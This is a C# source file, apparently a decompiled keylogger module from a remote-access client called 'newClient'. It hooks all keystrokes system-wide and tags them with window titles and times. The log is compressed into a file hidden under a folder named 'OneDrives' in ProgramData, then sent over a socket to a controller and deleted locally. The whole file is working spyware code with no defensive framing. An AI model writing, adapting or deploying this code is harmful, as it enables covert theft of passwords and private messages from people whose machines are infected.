using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using algorithm;
using newClient.Comms;
using newClient.Utilities;

namespace newClient.keyboard;

public class keyboardManagaers
{
	private static readonly byte[] Operationpwd = Encoding.UTF8.GetBytes("keyboard");

	private object syncroot = new object();

	private object LogSyncRoot = new object();

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private NtApi32.HookProc _KeyboardProc;

	private IntPtr _HHOOK = IntPtr.Zero;

	public static List<byte> KeyboardList = new List<byte>();

	private string CurrentActiveWindowTitle;

	public static string keyboardfilePath = Environment.GetEnvironmentVariable("systemdrive") + "\\ProgramData\\OneDrives";

	public keyboardManagaers()
	{
		if (!Directory.Exists(keyboardfilePath))
		{
			Directory.CreateDirectory(keyboardfilePath);
		}
		keyboardfilePath = Path.Combine(keyboardfilePath, "kb.db");
	}

	public void Run()
	{
		if (Process.GetCurrentProcess().SessionId == 1 && MutexUtils.CreateMutex("board"))
		{
			Thread thread = new Thread((ParameterizedThreadStart)delegate
			{
				WindowStation.SetWindowStation();
				KeyBoardDisplayList.Init();
				_KeyboardProc = KeyboardProc;
				KeyboardSetHook();
				Application.Run();
			});
			thread.SetApartmentState(ApartmentState.MTA);
			thread.Start();
		}
		ThreadPool.QueueUserWorkItem(loopKeyboardProc);
	}

	public void getKeyboardContent(byte[] bytes)
	{
		contentProcessor();
		lock (LogSyncRoot)
		{
			byte[] array = ReadKeyboardContent();
			if (array != null && array.Length != 0)
			{
				SocketManger.SocketMangerSendMessage(GZip.Compress(array), 101, BitConverter.ToInt32(bytes, 0));
				if (File.Exists(keyboardfilePath))
				{
					File.Delete(keyboardfilePath);
				}
			}
		}
	}

	public void contentProcessor()
	{
		try
		{
			byte[] array = null;
			lock (syncroot)
			{
				if (KeyboardList.Count > 0)
				{
					array = KeyboardList.ToArray();
					KeyboardList.Clear();
				}
			}
			if (array != null && array.Length == 0)
			{
				return;
			}
			lock (LogSyncRoot)
			{
				List<byte> list = new List<byte>();
				byte[] array2 = ReadKeyboardContent();
				if (array2 != null)
				{
					list.AddRange(array2);
				}
				list.AddRange(array);
				File.WriteAllBytes(keyboardfilePath, GZip.Compress(list.ToArray()));
			}
		}
		catch (Exception)
		{
		}
	}

	private byte[] ReadKeyboardContent()
	{
		if (File.Exists(keyboardfilePath))
		{
			byte[] array = File.ReadAllBytes(keyboardfilePath);
			if (array != null && array.Length != 0)
			{
				return GZip.Decompress(array);
			}
		}
		return null;
	}

	private void loopKeyboardProc(object state)
	{
		while (true)
		{
			Thread.Sleep(TimeSpan.FromSeconds(5.0));
			try
			{
				contentProcessor();
			}
			catch (Exception)
			{
			}
		}
	}

	private void KeyboardSetHook()
	{
		try
		{
			using Process process = Process.GetCurrentProcess();
			using ProcessModule processModule = process.MainModule;
			_HHOOK = NtApi32.SetWindowsHookEx(13, _KeyboardProc, NtApi32.GetModuleHandle(processModule.ModuleName), 0u);
			if (_HHOOK == IntPtr.Zero)
			{
				throw new Exception();
			}
		}
		catch (Exception)
		{
			KeyboardList = null;
			_KeyboardProc = null;
			KeyBoardDisplayList.clearHashtable();
		}
	}

	private IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
	{
		try
		{
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				StringBuilder stringBuilder = new StringBuilder();
				int num = Marshal.ReadInt32(lParam);
				string text = KeyBoardDisplayList.GetStrByCode(num) ?? ("[" + Enum.GetName(typeof(Keys), num) + "]");
				string activeWindowTitle = GetActiveWindowTitle();
				if (activeWindowTitle.Equals(CurrentActiveWindowTitle))
				{
					stringBuilder.Append(text);
				}
				else
				{
					stringBuilder.AppendLine();
					stringBuilder.AppendLine();
					stringBuilder.AppendLine("[ title ]: " + activeWindowTitle);
					stringBuilder.AppendLine("[ time ]: " + DateTime.Now);
					stringBuilder.Append("[ content ]: " + text);
					CurrentActiveWindowTitle = activeWindowTitle;
				}
				lock (syncroot)
				{
					KeyboardList.AddRange(Encoding.UTF8.GetBytes(stringBuilder.ToString().ToLower()));
				}
			}
			return NtApi32.CallNextHookEx(_HHOOK, nCode, wParam, lParam);
		}
		catch (Exception)
		{
			return IntPtr.Zero;
		}
	}

	private string GetActiveWindowTitle()
	{
		try
		{
			NtApi32.GetWindowThreadProcessId(NtApi32.GetForegroundWindow(), out var lpdwProcessId);
			return Process.GetProcessById((int)lpdwProcessId).MainWindowTitle ?? "?????";
		}
		catch
		{
			return "?????";
		}
	}

	public void KeyboardStopSetHook()
	{
		try
		{
			NtApi32.UnhookWindowsHookEx(_HHOOK);
			KeyboardList?.Clear();
			Application.Exit();
		}
		catch (Exception)
		{
		}
		finally
		{
			KeyBoardDisplayList.clearHashtable();
			KeyboardList = null;
			_KeyboardProc = null;
			GC.Collect();
		}
	}
}
